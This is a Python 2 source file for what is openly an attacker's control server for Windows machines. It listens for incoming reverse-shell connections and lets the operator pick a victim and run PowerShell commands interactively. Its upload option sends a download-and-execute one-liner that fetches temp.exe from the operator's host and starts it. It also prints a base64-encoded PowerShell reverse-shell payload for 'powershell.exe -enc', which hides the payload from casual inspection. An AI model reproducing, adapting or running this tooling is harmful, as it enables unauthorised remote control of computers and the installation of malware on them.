#!/usr/bin/python
import socket
import random
import re
import sys
import os
from threading import Thread
from main import *

def startSocket(ipaddr, port):
    clientlist = []
    clientnumber = 0
    targetchoice = ''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((ipaddr, int(port)))
    s.listen(1)
    print "listening port %s"%port
    worker = Thread(target=runSocket,args=(s, clientlist, clientnumber))
    worker.setDaemon(True)
    worker.start()
    printListener(ipaddr, port)
    print "Waiting for clients"
    while True:
        for client in clientlist:
            print str(client['client']) + ': ' +  client['clientaddress']
            if client:
                targetchoice = raw_input('Choose target :>')
        for client in clientlist:
            if targetchoice == str(client['client']):
                while client:
                    menu = raw_input('[u]pload\n[s]hell\n[exit]\n>>')
                    if menu.lower() == "u":
                        fileToUpload = raw_input('File to upload:')
                        FUNCTIONS().DoServe(ipaddr,fileToUpload.split('/')[-1].rstrip('.exe'),os.path.dirname(fileToUpload))
                        print "$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\""
                        client['clientinstance'].sendall("$a = New-Object System.Net.WebClient;$a.DownloadFile(\"http://" + ipaddr + ':8000/' + fileToUpload.split('/')[-1] + "\",\"$Env:TEMP\\temp.exe\");Start-Process \"$Env:TEMP\\temp.exe\"")
                    elif menu.lower() == "s":
                        while True:
                            data = ''
                            command = raw_input("PS >")
                            if command == "exit":
                                break
                            if command == "":
                                continue
                            client['clientinstance'].sendall(command)
                            data = client['clientinstance'].recv(16834)
                            if data[-1] == "\x00":
                                sys.stdout.write(data)
                                sys.stdout.flush()
                    elif menu.lower() == "exit":
                        client['clientinstance'].close()
                        clientlist.remove(client)
                        print "Closing Connection"
                        break
            else:
                break
    s.close()

def runSocket(s, clientlist, clientnumber):
    while True:
        clientconn, address = s.accept()
        ip , port = address
        if clientconn:
            clientnumber += 1
            print "\nconnection from %s %s"%(ip,port)
        clientlist.append({'client':clientnumber,'clientinstance':clientconn,'clientaddress':ip,'clientport':port})

def printListener(ipaddr,port):
    windows_ps_rev_shell = (
        "$client = New-Object System.Net.Sockets.TCPClient('" + ipaddr + "','" + str(port) + "');"
        "$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};"
        "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)"
        "{$EncodedText = New-Object -TypeName System.Text.ASCIIEncoding; $data = $EncodedText.GetString($bytes,0, $i);"
        "$commandback = (Invoke-Expression -Command $data 2>&1 | Out-String );"
        "$backres = $commandback + ($error[0] | Out-String) + \"\x00\";$error.clear();"
        "$sendbyte = ([text.encoding]::ASCII).GetBytes($backres);$stream.Write($sendbyte,0,$sendbyte.Length);"
        "$stream.Flush()};$client.Close();if ($listener){$listener.Stop()}")
    print 'powershell.exe -enc ' + windows_ps_rev_shell.encode('utf_16_le').encode('base64').replace('\n','')
